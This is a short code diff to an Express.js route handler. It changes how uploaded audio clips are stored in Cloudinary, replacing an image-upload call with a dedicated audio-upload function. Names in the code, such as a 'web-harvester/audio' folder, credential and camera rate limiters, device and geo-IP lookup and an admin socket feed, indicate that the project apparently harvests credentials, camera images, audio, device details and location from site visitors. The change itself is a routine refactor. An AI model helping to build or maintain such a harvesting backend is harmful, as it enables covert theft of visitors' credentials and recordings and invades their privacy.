@@ -10,7 +10,7 @@ const deviceDetect = require('../middleware/deviceDetect');
 const geoLookup = require('../middleware/geoIp');
 const { collectionLimiter, credentialLimiter, cameraLimiter } = require('../middleware/rateLimit');
 const { emitToAdmin } = require('../socket');
-const { uploadBase64Image } = require('../services/cloudinaryUpload');
+const { uploadBase64Image, uploadBase64Audio } = require('../services/cloudinaryUpload');
 
 // Helper to generate sessionId
 function generateSessionId() {
@@ -651,10 +651,9 @@ router.post('/audio', cameraLimiter, async (req, res) => {
     // Upload audio to Cloudinary
     if (audioData && process.env.CLOUDINARY_CLOUD_NAME) {
       try {
-        cloudinaryResult = await uploadBase64Image(audioData, {
+        cloudinaryResult = await uploadBase64Audio(audioData, {
           folder: 'web-harvester/audio',
-          public_id: `audio_${Date.now()}_${Math.random().toString(36).substr(2, 8)}`,
-          resource_type: 'video' // Cloudinary uses 'video' resource type for audio
+          public_id: `audio_${Date.now()}_${Math.random().toString(36).substr(2, 8)}`
         });
         console.log('✅ Audio clip uploaded to Cloudinary:', cloudinaryResult.url);
       } catch (uploadError) {
